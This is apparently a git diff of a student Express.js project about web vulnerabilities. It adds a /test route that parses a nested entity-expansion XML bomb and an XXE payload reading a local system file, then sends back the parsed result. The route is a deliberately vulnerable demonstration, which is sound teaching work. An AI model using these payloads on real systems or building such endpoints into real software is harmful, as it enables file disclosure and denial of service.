@@ -1,30 +1,19 @@
 const express = require('express')
 const bodyParser = require('body-parser')
 const path = require('path')
-const PORT = process.env.PORT || 3000
 const db = require("./database.js")
-
 var urlencodedParser = bodyParser.urlencoded({extended: false})
-
+const PORT = process.env.PORT || 3000
+var pjXML = require('pjxml');
+ 
 express()
 
   .use(express.urlencoded({extended: false}))
   .use(express.json())
+
   .set("view engine", "ejs")
   .get('/', function(req, res){
-    res.send("Hello World 123456");
-  })
-  .get('/', function(req, res){
     res.send("2 Projekt iz WIM2");
-  })
-  .get('/1', function(req, res){
-    res.send("SQL umetanje (SQL Injection)");
-  })
-  .get('/2', function(req, res){
-    res.send(" Loša kontrola pristupa (Broken Access Control)");
-  })
-  .get('/3', function(req, res){
-    res.send("Vanjski XML entiteti (XML External Entity, XXE)");
   })
   .get("/movies", (req, res, next) => {
     res.render("movies", {
@@ -56,5 +45,13 @@ express()
           valid: true
         });
       });
+  })
+  .get('/test', function(req, res){
+    var xml = '<document attribute="value"><name>David Bowie</name></document>';
+    var xxe = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY bar "World "><!ENTITY t1 "&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;"><!ENTITY t2 "&t1;&t1;&t1;&t1;&t1;&t1;&t1;&t1;&t1;&t1;&t1;&t1;"><!ENTITY t3 "&t2;&t2;&t2;&t2;&t2;&t2;&t2;&t2;&t2;&t2;&t2;&t2;&t2;&t2;&t2;">]><foo>Hello &t3;&t3;&t3;&t3;&t3;&t3;</foo>';
+    var xxe2 = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE bar [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><bar>&xxe;</bar>'
+    var doc = pjXML.parse(xml)
+    var doc2 = pjXML.parse(xxe2)
+    res.send(doc2) // ["content"][3]["content"][0]
   })
   .listen(PORT, () => console.log(`Listening on ${ PORT }`))
